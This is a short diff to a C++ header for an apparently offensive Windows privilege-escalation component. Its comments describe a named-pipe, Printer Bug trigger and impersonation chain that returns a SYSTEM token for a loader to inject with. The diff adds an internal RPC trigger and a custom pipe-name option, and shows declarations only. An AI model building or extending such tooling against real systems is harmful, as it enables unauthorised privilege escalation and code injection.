@@ -54,8 +54,8 @@ private:
     // Helper methods - process spawning
     bool SpawnProcessWithToken(HANDLE hSystemToken, DWORD& outProcessId);
 
-    // Helper method - RPC trigger (external only for Phase 1)
-    // In Phase 2, this will be replaced by embedded DLL call
+    // Helper methods - RPC trigger
+    bool TriggerPrinterBugInternal(const std::string& pipeName);
     bool TriggerPrinterBugExternal(const std::string& pipeName);
 
 public:
@@ -65,7 +65,8 @@ public:
     // Main public interface
     // Execute the escalation chain: pipe -> wait -> impersonate -> return SYSTEM token
     // Returns HANDLE to primary SYSTEM token for caller to use (loader does the injection)
-    bool Execute(HANDLE& outSystemToken);
+    // If pipeName is provided, use it instead of generating random one
+    bool Execute(HANDLE& outSystemToken, const std::string& customPipeName = "");
 
     // Configuration setters
     void SetVerbose(bool v) { verbose = v; }
